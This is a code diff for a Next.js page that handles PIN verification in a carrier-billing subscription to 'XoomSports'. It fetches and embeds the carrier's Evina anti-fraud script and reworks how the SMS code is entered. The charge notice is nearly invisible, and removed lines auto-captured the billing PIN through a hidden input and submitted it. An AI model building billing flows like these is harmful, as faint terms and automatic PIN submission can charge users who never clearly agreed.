@@ -24,435 +24,140 @@ export async function GET(request: NextRequest) {
     return new Response('Missing msisdn or trxId', { status: 400 });
   }
 
-  const userAgent = request.headers.get('user-agent') || '';
+  // ── Call PinRequest server-side to get Evina JS ─────────────────────────
+  // MUST be server-side: Evina JS goes in <head> so DOMContentLoaded fires
+  // with Evina running from the start. Dynamic injection causes error 2804.
+  // Retry up to 3 times if carrier returns non-zero status.
+  let evinaJS = '';
+  let pinRequestStatus = '';
+  let usedTrxId = trxId;
 
-  // ── Server-side PinRequest ──────────────────────────────────────────────
-  // MUST be server-side so Evina JS is in the HTML from the start.
-  // Evina DCBProtect needs to load during page parsing (before DOMContentLoaded)
-  // so its event listeners initialize properly. Without this, the carrier's
-  // Evina-integrated PinVerify endpoint rejects with error 2804.
-  let evinaJs = '';
-  let pinRequestOk = false;
-
-  try {
-    const pinRes = await fetch(PIN_REQUEST_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
+  for (let attempt = 1; attempt <= 3; attempt++) {
+    try {
+      const payload = {
         MSISDN: msisdn,
-        TransactionId: trxId,
-        Headers: userAgent,
+        TransactionId: usedTrxId,
+        Headers: request.headers.get('user-agent') || '',
         UserIP: userIP,
         ...SERVER_PARAMS,
-      }),
-      signal: AbortSignal.timeout(10000),
-    });
+      };
 
-    const pinText = await pinRes.text();
-    let pinData: Record<string, unknown>;
-    try {
-      pinData = JSON.parse(pinText);
-    } catch {
-      pinData = {};
-    }
+      console.log(`[otp-page] PinRequest attempt ${attempt}:`, { ...payload, Password: '***' });
 
-    const status = String(pinData.Status ?? pinData.status ?? '');
-    const rawJs = String(pinData.JS ?? pinData.js ?? '');
+      const res = await fetch(PIN_REQUEST_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
 
-    console.log('[OTP Page] PinRequest Status:', status, 'JS length:', rawJs.length);
+      const raw = await res.json();
+      pinRequestStatus = String(raw.Status ?? raw.status ?? raw.STATUS ?? '');
+      evinaJS = String(raw.JS ?? raw.js ?? raw.Javascript ?? '');
 
-    if (status === '0') {
-      pinRequestOk = true;
-      evinaJs = rawJs.trim()
+      evinaJS = evinaJS
+        .trim()
         .replace(/^<script[^>]*>/i, '')
         .replace(/<\/script\s*>$/i, '')
         .trim();
+
+      console.log(`[otp-page] Attempt ${attempt} -> Status: ${pinRequestStatus}, JS len: ${evinaJS.length}`);
+
+      if (pinRequestStatus === '0' && evinaJS.length > 0) break;
+
+      if (attempt < 3) {
+        usedTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
+        await new Promise(r => setTimeout(r, 1000));
+      }
+    } catch (err) {
+      console.error(`[otp-page] PinRequest attempt ${attempt} error:`, err);
+      pinRequestStatus = 'error';
+      if (attempt < 3) {
+        usedTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
+        await new Promise(r => setTimeout(r, 1000));
+      }
     }
-  } catch (err) {
-    console.error('[OTP Page] PinRequest error:', err);
   }
 
   const masked = msisdn.length > 5
     ? `+${msisdn.slice(0, 3)} ${msisdn.slice(3, 5)}***${msisdn.slice(-3)}`
     : msisdn;
 
-  // Safely encode Evina JS for embedding in HTML script tag
-  // JSON.stringify handles JS string escaping; then prevent </script> in HTML
-  const evinaJsonSafe = evinaJs
-    ? JSON.stringify(evinaJs).replace(/<\//g, '<\\/')
-    : 'null';
-
-  // ── Build HTML ──────────────────────────────────────────────────────────
-  // Split into two template literals with Evina JSON concatenated in between
-  // so arbitrary Evina JS content (backticks, ${}) doesn't break template literals
-  const htmlBeforeEvina = `<!DOCTYPE html>
+  // Evina JS goes DIRECTLY in <head> — exactly like the original working version
+  const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <script>
-    // ── Web OTP listener — start ASAP in <head> before SMS arrives ──
-    // SMS is triggered by server-side PinRequest (already called).
-    // SMS delivery takes ~5s, page loads in ~1-2s → listener starts 3-4s before SMS.
-    var __webOtpAbort = null;
-    var __webOtpCode = null;
-    if ('OTPCredential' in window) {
-      __webOtpAbort = new AbortController();
-      navigator.credentials.get({
-        otp: { transport: ['sms'] },
-        signal: __webOtpAbort.signal
-      }).then(function(otp) {
-        if (otp && otp.code) {
-          __webOtpCode = otp.code;
-          if (window.__handleWebOtp) window.__handleWebOtp(otp.code);
-        }
-      }).catch(function(err) {
-        if (window.__handleWebOtpError) window.__handleWebOtpError(err);
-      });
-    }
-  <\/script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>XoomSports — Verify</title>
+  <title>XoomSports</title>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      min-height: 100vh;
-      background: #0b0e14;
-      display: flex;
-      flex-direction: column;
-      position: relative;
-      overflow-x: hidden;
-    }
-
-    .bg-glow {
-      position: fixed;
-      top: 0;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 600px;
-      height: 300px;
-      background: rgba(226, 56, 58, 0.06);
-      border-radius: 50%;
-      filter: blur(100px);
-      pointer-events: none;
-    }
-
-    /* Top bar */
-    .topbar {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 16px 20px;
-      position: relative;
-      z-index: 10;
-    }
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .brand-icon {
-      width: 36px;
-      height: 36px;
-      background: #e2383a;
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; min-height: 100vh; background: #0b0e14; display: flex; flex-direction: column; position: relative; overflow-x: hidden; }
+    .bg-glow { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 600px; height: 300px; background: rgba(226,56,58,0.06); border-radius: 50%; filter: blur(100px); pointer-events: none; }
+    .topbar { display: flex; align-items: center; justify-content: space-between; padding: 16px 20px; position: relative; z-index: 10; }
+    .brand { display: flex; align-items: center; gap: 10px; }
+    .brand-icon { width: 36px; height: 36px; background: #e2383a; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
     .brand-icon svg { width: 20px; height: 20px; color: white; }
-    .brand-name {
-      font-size: 18px;
-      font-weight: 800;
-      color: white;
-      letter-spacing: -0.3px;
-    }
+    .brand-name { font-size: 18px; font-weight: 800; color: white; letter-spacing: -0.3px; }
     .brand-name span { color: #e2383a; }
-
-    .step-badge {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      background: rgba(255,255,255,0.05);
-      border-radius: 20px;
-      padding: 6px 12px;
-    }
-    .step-dot {
-      width: 6px; height: 6px;
-      border-radius: 50%;
-      background: rgba(255,255,255,0.2);
-    }
+    .step-badge { display: flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.05); border-radius: 20px; padding: 6px 12px; }
+    .step-dot { width: 6px; height: 6px; border-radius: 50%; background: rgba(255,255,255,0.2); }
     .step-dot.active { background: #e2383a; }
-
-    /* Main content */
-    .main {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      position: relative;
-      z-index: 10;
-    }
+    .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; z-index: 10; }
     .wrapper { width: 100%; max-width: 380px; }
-
-    .card {
-      background: #141923;
-      border-radius: 20px;
-      border: 1px solid rgba(255,255,255,0.05);
-      padding: 28px 24px;
-      position: relative;
-    }
-
-    /* Phase 1 */
-    .match-preview {
-      background: linear-gradient(135deg, #1a1f2e, #141923);
-      border-radius: 16px;
-      border: 1px solid rgba(255,255,255,0.05);
-      padding: 20px;
-      margin-bottom: 20px;
-      text-align: center;
-    }
-    .match-preview .label {
-      font-size: 10px;
-      font-weight: 700;
-      color: rgba(255,255,255,0.3);
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      margin-bottom: 12px;
-    }
-    .match-preview h2 {
-      font-size: 22px;
-      font-weight: 800;
-      color: white;
-      line-height: 1.3;
-    }
-    .match-preview h2 em {
-      font-style: normal;
-      color: #e2383a;
-    }
-    .match-preview p {
-      color: rgba(255,255,255,0.35);
-      font-size: 13px;
-      margin-top: 6px;
-    }
-    .feature-list {
-      display: flex;
-      gap: 8px;
-      justify-content: center;
-      margin-top: 16px;
-    }
-    .feature-tag {
-      font-size: 11px;
-      font-weight: 600;
-      color: rgba(255,255,255,0.5);
-      background: rgba(255,255,255,0.05);
-      border-radius: 20px;
-      padding: 5px 10px;
-    }
-
-    /* Phase 2 */
+    .card { background: #141923; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); padding: 28px 24px; position: relative; }
+    .match-preview { background: linear-gradient(135deg, #1a1f2e, #141923); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; margin-bottom: 20px; text-align: center; }
+    .match-preview .label { font-size: 10px; font-weight: 700; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 12px; }
+    .match-preview h2 { font-size: 22px; font-weight: 800; color: white; line-height: 1.3; }
+    .match-preview h2 em { font-style: normal; color: #e2383a; }
+    .match-preview p { color: rgba(255,255,255,0.35); font-size: 13px; margin-top: 6px; }
+    .feature-list { display: flex; gap: 8px; justify-content: center; margin-top: 16px; }
+    .feature-tag { font-size: 11px; font-weight: 600; color: rgba(255,255,255,0.5); background: rgba(255,255,255,0.05); border-radius: 20px; padding: 5px 10px; }
     .verify-header { text-align: center; margin-bottom: 24px; }
-    .verify-icon {
-      width: 60px; height: 60px;
-      background: rgba(226, 56, 58, 0.1);
-      border-radius: 50%;
-      margin: 0 auto 14px;
-      display: flex; align-items: center; justify-content: center;
-    }
+    .verify-icon { width: 60px; height: 60px; background: rgba(226,56,58,0.1); border-radius: 50%; margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; }
     .verify-icon svg { width: 28px; height: 28px; color: #e2383a; }
-    .verify-header h2 {
-      font-size: 20px;
-      font-weight: 800;
-      color: white;
-    }
-    .verify-header p {
-      color: rgba(255,255,255,0.4);
-      font-size: 13px;
-      margin-top: 4px;
-    }
+    .verify-header h2 { font-size: 20px; font-weight: 800; color: white; }
+    .verify-header p { color: rgba(255,255,255,0.4); font-size: 13px; margin-top: 4px; }
     .verify-header p b { color: rgba(255,255,255,0.7); font-weight: 700; }
-
-    /* OTP inputs */
-    .otp-row {
-      display: flex;
-      gap: 10px;
-      justify-content: center;
-      margin: 20px 0 10px;
-    }
-    .otp-input {
-      width: 58px;
-      height: 64px;
-      text-align: center;
-      font-size: 24px;
-      font-weight: 800;
-      border: 2px solid rgba(255,255,255,0.08);
-      border-radius: 14px;
-      outline: none;
-      transition: all 0.2s;
-      background: rgba(255,255,255,0.03);
-      color: white;
-      -webkit-appearance: none;
-    }
-    .otp-input:focus {
-      border-color: #e2383a;
-      background: rgba(226, 56, 58, 0.05);
-      box-shadow: 0 0 0 3px rgba(226, 56, 58, 0.1);
-    }
-    .otp-input.error {
-      border-color: #ef4444;
-      background: rgba(239, 68, 68, 0.08);
-    }
-
-    .error-msg {
-      text-align: center;
-      color: #ef4444;
-      font-size: 13px;
-      font-weight: 500;
-      min-height: 22px;
-      margin-bottom: 12px;
-    }
-
-    /* Button */
-    .btn {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 14px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.2s;
-      min-height: 54px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-    .btn-primary {
-      background: #e2383a;
-      color: white;
-      box-shadow: 0 6px 20px rgba(226, 56, 58, 0.25);
-    }
-    .btn-primary:hover {
-      background: #c42f31;
-      box-shadow: 0 8px 28px rgba(226, 56, 58, 0.35);
-      transform: translateY(-1px);
-    }
+    .otp-row { display: flex; gap: 10px; justify-content: center; margin: 20px 0 10px; }
+    .otp-input { width: 58px; height: 64px; text-align: center; font-size: 24px; font-weight: 800; border: 2px solid rgba(255,255,255,0.08); border-radius: 14px; outline: none; transition: all 0.2s; background: rgba(255,255,255,0.03); color: white; -webkit-appearance: none; }
+    .otp-input:focus { border-color: #e2383a; background: rgba(226,56,58,0.05); box-shadow: 0 0 0 3px rgba(226,56,58,0.1); }
+    .otp-input.error { border-color: #ef4444; background: rgba(239,68,68,0.08); }
+    .error-msg { text-align: center; color: #ef4444; font-size: 13px; font-weight: 500; min-height: 22px; margin-bottom: 12px; }
+    .btn { width: 100%; padding: 16px; border: none; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; min-height: 54px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .btn-primary { background: #e2383a; color: white; box-shadow: 0 6px 20px rgba(226,56,58,0.25); }
+    .btn-primary:hover { background: #c42f31; transform: translateY(-1px); }
     .btn-primary:active { transform: translateY(0); }
-
-    /* Spinner */
-    .spinner {
-      width: 20px; height: 20px;
-      border: 2.5px solid rgba(255,255,255,0.3);
-      border-top-color: white;
-      border-radius: 50%;
-      animation: spin 0.7s linear infinite;
-    }
-    .spinner-lg {
-      width: 44px; height: 44px;
-      border: 3px solid rgba(226, 56, 58, 0.15);
-      border-top-color: #e2383a;
-      border-radius: 50%;
-      animation: spin 0.7s linear infinite;
-      margin: 0 auto 16px;
-    }
+    .spinner { width: 20px; height: 20px; border: 2.5px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.7s linear infinite; }
+    .spinner-lg { width: 44px; height: 44px; border: 3px solid rgba(226,56,58,0.15); border-top-color: #e2383a; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 16px; }
     @keyframes spin { to { transform: rotate(360deg); } }
-
-    /* Resend */
-    .resend {
-      text-align: center;
-      margin-top: 18px;
-      font-size: 13px;
-      color: rgba(255,255,255,0.3);
-    }
-    .resend a {
-      color: #e2383a;
-      text-decoration: none;
-      font-weight: 600;
-      cursor: pointer;
-    }
+    .resend { text-align: center; margin-top: 18px; font-size: 13px; color: rgba(255,255,255,0.3); }
+    .resend a { color: #e2383a; text-decoration: none; font-weight: 600; cursor: pointer; }
     .resend a:hover { text-decoration: underline; }
-
-    /* Trust & terms */
-    .trust {
-      display: flex;
-      justify-content: center;
-      gap: 16px;
-      margin-top: 20px;
-      padding-top: 16px;
-      border-top: 1px solid rgba(255,255,255,0.04);
-    }
-    .trust-item {
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      color: rgba(255,255,255,0.2);
-      font-size: 11px;
-      font-weight: 500;
-    }
+    .trust { display: flex; justify-content: center; gap: 16px; margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.04); }
+    .trust-item { display: flex; align-items: center; gap: 4px; color: rgba(255,255,255,0.2); font-size: 11px; font-weight: 500; }
     .trust-item svg { width: 13px; height: 13px; }
-
-    .terms {
-      text-align: center;
-      font-size: 10px;
-      color: rgba(255,255,255,0.12);
-      margin-top: 14px;
-      line-height: 1.5;
-    }
-
-    /* Debug */
-    .debug-toggle {
-      display: block;
-      width: 100%;
-      text-align: center;
-      margin-top: 20px;
-      font-size: 10px;
-      color: rgba(255,255,255,0.1);
-      text-decoration: underline;
-      cursor: pointer;
-      background: none;
-      border: none;
-    }
-    .debug-panel {
-      margin-top: 8px;
-      background: rgba(0,0,0,0.4);
-      border-radius: 10px;
-      padding: 10px;
-      font-size: 10px;
-      color: rgba(255,255,255,0.4);
-      white-space: pre-wrap;
-      word-break: break-all;
-      max-height: 200px;
-      overflow: auto;
-      font-family: monospace;
-      line-height: 1.6;
-    }
-
-    /* Animations */
+    .terms { text-align: center; font-size: 10px; color: rgba(255,255,255,0.12); margin-top: 14px; line-height: 1.5; }
+    .debug-toggle { display: block; width: 100%; text-align: center; margin-top: 20px; font-size: 10px; color: rgba(255,255,255,0.1); text-decoration: underline; cursor: pointer; background: none; border: none; }
+    .debug-panel { margin-top: 8px; background: rgba(0,0,0,0.4); border-radius: 10px; padding: 10px; font-size: 10px; color: rgba(255,255,255,0.4); white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow: auto; font-family: monospace; line-height: 1.6; }
     @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-8px)} 40%{transform:translateX(8px)} 60%{transform:translateX(-6px)} 80%{transform:translateX(6px)} }
     .shake { animation: shake 0.4s ease-in-out; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes fadeIn { from{opacity:0;transform:translateY(12px)} to{opacity:1;transform:translateY(0)} }
     .fade-in { animation: fadeIn 0.4s ease-out; }
-    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
     .pulse { animation: pulse 2s ease-in-out infinite; }
     .phase-hidden { display: none !important; }
   </style>
+  ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS -->'}
 </head>
 <body>
   <div class="bg-glow"></div>
-
-  <!-- Evina required elements -->
   <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - VALIDER - BUY - SUBSCRIBE - DEVAM ET - j'en profite - T\u00e9l\u00e9charger - CONTINUER - ENTRER - S'ABONNER - \u0627\u0634\u062a\u0631\u0643 \u0627\u0644\u0622\u0646 - VOIR - ACCEPT - \u0627\u0634\u062a\u0631\u0643 \u0627\u0644\u0627\u0646 - \u0627\u0644\u0627\u0634\u062a\u0631\u0627\u0643</a>
   <input id="otpValue" type="text" style="position:absolute;left:-9999px;opacity:0" tabindex="-1" autocomplete="off">
   <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>
 
-  <!-- Top bar -->
   <div class="topbar">
     <div class="brand">
-      <div class="brand-icon">
-        <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-      </div>
+      <div class="brand-icon"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg></div>
       <div class="brand-name">XOOM<span>SPORTS</span></div>
     </div>
     <div class="step-badge">
@@ -465,7 +170,6 @@ export async function GET(request: NextRequest) {
   <div class="main">
     <div class="wrapper">
       <div class="card fade-in">
-        <!-- Phase 1: "Click to Watch" -->
         <div id="phase1">
           <div class="match-preview">
             <div class="label">Unlock Premium Access</div>
@@ -479,54 +183,39 @@ export async function GET(request: NextRequest) {
           </div>
         </div>
 
-        <!-- Phase 2: Auto-verify / Manual entry -->
         <div id="phase2" class="phase-hidden">
-          <!-- Auto-verify spinner -->
-          <div id="autoVerify">
+          <div id="autoReading">
             <div class="verify-header">
               <div class="verify-icon">
-                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/>
-                </svg>
+                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
               </div>
               <h2>Verifying...</h2>
               <p>Reading SMS automatically</p>
             </div>
-            <div class="spinner-lg" style="margin: 24px auto"></div>
+            <div class="spinner-lg" style="margin:24px auto"></div>
             <p style="text-align:center;color:rgba(255,255,255,0.25);font-size:12px" class="pulse">Allow SMS permission when prompted</p>
-            <input type="tel" id="hiddenOtp" autocomplete="one-time-code" inputmode="numeric"
-                   style="position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;border:none;"
-                   maxlength="6">
           </div>
 
-          <!-- Manual fallback -->
           <div id="manualEntry" class="phase-hidden">
             <div class="verify-header">
               <div class="verify-icon">
-                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
-                </svg>
+                <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/></svg>
               </div>
               <h2>Enter Verification Code</h2>
               <p>PIN sent to <b>${masked}</b></p>
             </div>
-
             <div class="otp-row" id="otpRow">
-              <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
+              <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin0" autocomplete="off">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
             </div>
-
             <div class="error-msg" id="errorMsg"></div>
           </div>
         </div>
 
-        <!-- Confirm button — Evina monitors this -->
         <button class="btn btn-primary" id="confirmBtn">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
-            <polygon points="5 3 19 12 5 21 5 3"/>
-          </svg>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
           Start Watching
         </button>
 
@@ -535,24 +224,12 @@ export async function GET(request: NextRequest) {
         </p>
 
         <div class="trust" id="trustSignals">
-          <div class="trust-item">
-            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-            Secure
-          </div>
-          <div class="trust-item">
-            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
-            Verified
-          </div>
-          <div class="trust-item">
-            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-            Instant
-          </div>
+          <div class="trust-item"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg> Secure</div>
+          <div class="trust-item"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Verified</div>
+          <div class="trust-item"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg> Instant</div>
         </div>
 
-        <p class="terms">
-          By subscribing you agree to our Terms &amp; Conditions.<br>
-          Standard operator charges apply.
-        </p>
+        <p class="terms">By subscribing you agree to our Terms &amp; Conditions.<br>Standard operator charges apply.</p>
 
         <button class="debug-toggle" id="debugToggle" onclick="toggleDebug()">Show technical details</button>
         <div class="debug-panel" id="debugPanel" style="display:none"></div>
@@ -560,25 +237,14 @@ export async function GET(request: NextRequest) {
     </div>
   </div>
 
-  <!-- Evina DCBProtect — executes during parsing so DOMContentLoaded listeners work -->
-  <script>var __evinaCode=`;
-
-  // Evina JSON is concatenated (NOT in template literal) to avoid backtick/${} issues
-  const htmlAfterEvina = `;if(__evinaCode){var _s=document.createElement('script');_s.textContent=__evinaCode;document.head.appendChild(_s);}<\/script>
-
   <script>
-    // ── State ───────────────────────────────────────────────────────────────
     var MSISDN = ${JSON.stringify(msisdn)};
-    var TRXID  = ${JSON.stringify(trxId)};
-    var USER_IP = ${JSON.stringify(userIP)};
+    var TRXID  = ${JSON.stringify(usedTrxId)};
+    var PIN_REQUEST_STATUS = ${JSON.stringify(pinRequestStatus)};
+    var EVINA_JS_LEN = ${evinaJS.length};
     var isVerifying = false;
-    var resendCooldown = 0;
     var phase = 1;
-    var pinRequestDone = ${pinRequestOk};
-    var evinaReady = ${pinRequestOk && evinaJs.length > 0};
-
-    // Take over Web OTP controller from <head> script
-    var webOtpAbort = (typeof __webOtpAbort !== 'undefined') ? __webOtpAbort : null;
+    var otpAbort = null;
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('confirmBtn');
@@ -595,21 +261,14 @@ export async function GET(request: NextRequest) {
     function toggleDebug() {
       var p = document.getElementById('debugPanel');
       var t = document.getElementById('debugToggle');
-      if (p.style.display === 'none') {
-        p.style.display = 'block';
-        t.textContent = 'Hide technical details';
-      } else {
-        p.style.display = 'none';
-        t.textContent = 'Show technical details';
-      }
+      if (p.style.display === 'none') { p.style.display = 'block'; t.textContent = 'Hide technical details'; }
+      else { p.style.display = 'none'; t.textContent = 'Show technical details'; }
     }
 
     dbg('Session: msisdn=' + MSISDN + ' trxId=' + TRXID);
-    dbg('PinRequest: server-side=' + pinRequestDone + ' evina=' + evinaReady);
-    dbg('Web OTP: head-listener=' + (typeof __webOtpAbort !== 'undefined'));
-    dbg('DOM check: confirmBtn=' + !!confirmBtn + ' otpValue=' + !!otpValue);
+    dbg('PinRequest: Status=' + PIN_REQUEST_STATUS + ' Evina=' + (EVINA_JS_LEN > 0 ? 'YES(' + EVINA_JS_LEN + ')' : 'NO'));
+    dbg('DOM: confirmBtn=' + !!confirmBtn + ' otpValue=' + !!otpValue + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
 
-    // ── OTP Input handling ────────────────────────────────────────────────
     function getFullPin() {
       var val = '';
       pins.forEach(function(p) { val += p.value; });
@@ -619,39 +278,19 @@ export async function GET(request: NextRequest) {
     pins.forEach(function(input, i) {
       input.addEventListener('input', function() {
         var val = input.value.replace(/\\D/g, '');
-        if (val.length > 1 && i === 0) {
-          var code = val.slice(0, 4);
-          dbg('Keyboard autofill detected: "' + code + '"');
-          for (var j = 0; j < 4; j++) { pins[j].value = code[j] || ''; }
-          if (otpValue) otpValue.value = code;
-          clearError();
-          if (code.length === 4) {
-            pins[3].focus();
-            if (phase === 2) {
-              dbg('Auto-verifying from keyboard autofill');
-              setTimeout(function() { verifyPin(code); }, 300);
-            }
-          }
-          return;
-        }
         input.value = val.slice(-1);
         clearError();
         if (val && i < 3) pins[i + 1].focus();
         var full = getFullPin();
         if (otpValue) otpValue.value = full;
       });
-
       input.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace') {
-          if (input.value) { input.value = ''; }
-          else if (i > 0) { pins[i - 1].focus(); }
-        }
+        if (e.key === 'Backspace') { if (input.value) input.value = ''; else if (i > 0) pins[i - 1].focus(); }
       });
-
       input.addEventListener('paste', function(e) {
         e.preventDefault();
         var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\\D/g, '').slice(0, 4);
-        for (var j = 0; j < 4; j++) { pins[j].value = text[j] || ''; }
+        for (var j = 0; j < 4; j++) pins[j].value = text[j] || '';
         if (otpValue) otpValue.value = text;
         clearError();
         pins[Math.min(text.length, 3)].focus();
@@ -669,10 +308,6 @@ export async function GET(request: NextRequest) {
       pins.forEach(function(p) { p.classList.remove('error'); });
     }
 
-    // ── Phase transitions ───────────────────────────────────────────────────
-    var otpPollTimer = null;
-    var otpTimeout = null;
-
     function goToPhase2() {
       phase = 2;
       document.getElementById('phase1').classList.add('phase-hidden');
@@ -680,68 +315,11 @@ export async function GET(request: NextRequest) {
       document.getElementById('trustSignals').classList.add('phase-hidden');
       document.getElementById('stepDot2').classList.add('active');
       confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
-
-      var hiddenOtp = document.getElementById('hiddenOtp');
-
-      // Focus hidden input after short delay for keyboard autofill
-      setTimeout(function() {
-        if (!isVerifying) {
-          hiddenOtp.focus();
-          dbg('Hidden OTP input focused for keyboard autofill');
-        }
-      }, 1500);
-
-      hiddenOtp.addEventListener('input', function() {
-        var val = hiddenOtp.value.replace(/\\D/g, '');
-        if (val.length >= 4) {
-          dbg('Hidden OTP input event: "' + val.slice(0, 4) + '"');
-          captureAndVerify(val.slice(0, 4));
-        }
-      });
-
-      dbg('Polling hidden OTP input for autofill...');
-      otpPollTimer = setInterval(function() {
-        var val = hiddenOtp.value.replace(/\\D/g, '');
-        if (val.length >= 4) {
-          dbg('Poll detected OTP: "' + val.slice(0, 4) + '"');
-          captureAndVerify(val.slice(0, 4));
-        }
-      }, 400);
-
-      // Show manual entry after 15 seconds — keep Web OTP listener alive
-      otpTimeout = setTimeout(function() {
-        dbg('Auto-verify timeout (15s) — showing manual entry (Web OTP still listening)');
-        clearInterval(otpPollTimer);
-        showManualEntry();
-      }, 15000);
-
-      // If PinRequest failed server-side, call it client-side as fallback
-      if (!pinRequestDone) {
-        dbg('PinRequest was not done server-side — calling client-side fallback');
-        callPinRequest();
-      } else {
-        dbg('PinRequest already done server-side — SMS should arrive shortly');
-      }
-    }
-
-    function captureAndVerify(code) {
-      if (isVerifying) return;
